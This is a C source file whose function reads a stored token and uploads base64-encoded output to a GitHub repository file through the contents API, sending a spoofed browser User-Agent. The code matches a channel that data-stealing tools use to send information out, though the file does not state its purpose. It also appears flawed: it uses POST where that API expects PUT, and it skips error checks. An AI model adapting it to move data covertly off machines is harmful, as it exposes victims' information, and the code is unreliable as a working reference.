#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include "github_api.h"
#include "config.h"
#include "utils.h"

int upload_output(const char* content) {
    FILE *tf = fopen(TOKEN_FILE, "r");
    if (!tf) return 0;
    char token_buf[256];
    fgets(token_buf, sizeof(token_buf), tf);
    token_buf[strcspn(token_buf, "\n")] = '\0';
    fclose(tf);

    char *encoded = base64_encode((const unsigned char*)content, strlen(content));
    if (!encoded) return 0;

    char *json = malloc(strlen(encoded) + 256);
    snprintf(json, strlen(encoded) + 256,
             "{ \"message\": \"upload\", \"content\": \"%s\", \"branch\": \"%s\" }",
             encoded, GITHUB_BRANCH);

    char url[512], auth_header[512];
    snprintf(url, sizeof(url), "https://api.github.com/repos/%s/%s/contents/output/log.txt",
             GITHUB_USERNAME, GITHUB_REPO);
    snprintf(auth_header, sizeof(auth_header), "Authorization: token %s", token_buf);

    CURL *curl = curl_easy_init();
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "User-Agent: Mozilla");
    headers = curl_slist_append(headers, auth_header);
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    CURLcode res = curl_easy_perform(curl);

    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);
    free(encoded);
    free(json);

    return (res == CURLE_OK);
}